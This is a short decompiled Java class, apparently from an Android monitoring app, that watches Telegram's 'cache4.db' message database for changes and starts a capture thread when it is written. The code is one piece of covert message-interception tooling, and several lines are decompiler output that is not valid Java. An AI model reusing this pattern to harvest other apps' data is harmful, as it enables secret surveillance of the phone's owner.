package com.vvt.capture.telegram.a;

import android.os.FileObserver;
import java.io.File;

class b
  extends FileObserver
{
  private String b;
  private Thread c = null;
  private File d;
  
  public b(a parama, String paramString)
  {
    super(paramString, 2);
    this.b = paramString;
  }
  
  public void onEvent(int paramInt, String paramString)
  {
    int i = 2;
    if (paramInt == i)
    {
      Object localObject = "cache4.db";
      boolean bool = paramString.equals(localObject);
      if (bool)
      {
        localObject = this.c;
        if (localObject == null)
        {
          localObject = new java/lang/Thread;
          c localc = new com/vvt/capture/telegram/a/c;
          localc.<init>(this);
          ((Thread)localObject).<init>(localc);
          this.c = ((Thread)localObject);
          localObject = this.c;
          ((Thread)localObject).start();
        }
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/a/removeFromPath.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */